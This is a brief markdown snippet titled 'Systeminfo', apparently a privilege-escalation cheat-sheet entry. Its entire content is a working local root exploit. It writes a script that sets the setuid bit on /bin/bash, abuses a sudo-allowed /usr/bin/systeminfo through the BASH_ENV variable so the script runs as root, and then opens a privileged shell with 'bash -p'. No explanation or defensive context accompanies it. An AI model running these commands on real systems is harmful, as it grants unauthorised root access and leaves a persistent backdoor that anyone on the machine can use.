
## Systeminfo

```bash
echo -e '#!/bin/bash\nchmod +s /bin/bash' > root.sh
chmod 777 root.sh
sudo BASH_ENV=root.sh /usr/bin/systeminfo
/bin/bash -p
```
